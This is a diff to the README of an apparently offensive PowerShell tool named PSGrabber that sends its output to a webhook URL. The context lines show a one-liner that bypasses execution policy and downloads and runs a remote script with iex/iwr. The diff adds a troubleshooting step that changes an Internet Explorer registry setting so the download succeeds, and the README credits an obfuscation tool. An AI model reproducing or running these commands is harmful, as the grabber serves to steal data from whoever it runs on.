@@ -48,6 +48,13 @@ $hookurl='';iex((iwr https://raw.githubusercontent.com/AROAH1337/PSGrabber/refs/
 powershell.exe -NoProfile -ExecutionPolicy bypass -Command "$hookurl='';iex((iwr https://raw.githubusercontent.com/AROAH1337/PSGrabber/refs/heads/main/PSGrabber.ps1).content)"
 ```
 
+## Troubleshooting
+
+If you run into something about the Internet Explorer engine not being available or not having been run, give this a go:
+```powershell
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main" -Name "DisableFirstRunCustomize" -Value 2
+```
+
 ## Acknowledgements
 
  - danielbohannon for The [obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) used in the program
